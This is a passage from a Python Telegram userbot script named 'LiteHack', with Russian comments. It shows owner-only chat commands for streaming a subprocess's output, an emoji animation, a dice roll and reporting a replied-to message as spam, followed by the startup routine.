        
        # Read output line by line
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            # Send each line of output
            await event.respond(f"<code>{line.decode().strip()}</code>", parse_mode='html')
        
        # Wait for process to complete
        await process.wait()
        
        # Send completion message
        await event.respond("Генерация завершена!")
        
    except Exception as e:
        await event.respond(f"Ошибка: {str(e)}")
    
@client.on(events.NewMessage(pattern=r'fr!love'))
@owner_only
async def send_love(event):
    hearts = ['❤️', '💕', '💖', '💗', '💘', '💝', '💞', '💓']
    message = await event.respond("Создаю анимацию сердечек...")
    
    for _ in range(10):  # 10 итераций анимации
        heart = random.choice(hearts)
        try:
            await message.edit(heart * 10)  # 10 сердечек в строке
            await asyncio.sleep(0.5)
        except Exception as e:
            logging.error(f"Ошибка в анимации: {e}")
            break
        
@client.on(events.NewMessage(pattern=r'fr!roll'))
@owner_only
async def roll_dice(event):
    """Бросает игральную кость и отправляет результат"""
    result = random.randint(1, 6)
    await event.respond(f"🎲 Результат броска: {result}")

@client.on(events.NewMessage(pattern=r'fr!report'))
@owner_only
async def report_user(event):
    """Отправляет жалобу на пользователя"""
    if event.is_reply:
        try:
            replied_msg = await event.get_reply_message()
            reason = InputReportReasonSpam()  # Можно изменить на другой reason
            
            await client(functions.messages.ReportRequest(
                peer=event.chat_id,
                id=[replied_msg.id],
                reason=reason,
                message="Нарушение правил"
            ))
            
            await event.respond("✅ Жалоба отправлена")
        except Exception as e:
            await event.respond(f"❌ Ошибка: {str(e)}")
    else:
        await event.respond("❌ Ответьте на сообщение пользователя, на которого хотите пожаловаться")

async def main():
    await client.start()
    print("")
    print(f"{INFO_COLOR}Userbot запущен{RESET_COLOR}")
    # Запуск aiogram polling в фоне
    asyncio.create_task(dp.start_polling())
    print(f"{INFO_COLOR}Бот запущен{RESET_COLOR}")
    print(f"{INFO_COLOR}Больше сообщений от скрипта не будет, исключительно логи.{RESET_COLOR}")
    print(f"{INFO_COLOR}Приятного пользования LiteHack!\n\n{RESET_COLOR}")
    print(f"{INFO_COLOR}Для выключения юзербота нажмите Ctrl + C{RESET_COLOR}")
    # Просто держим userbot запущенным
    await asyncio.Event().wait()
    
if __name__ == '__main__':
    client.loop.run_until_complete(main())
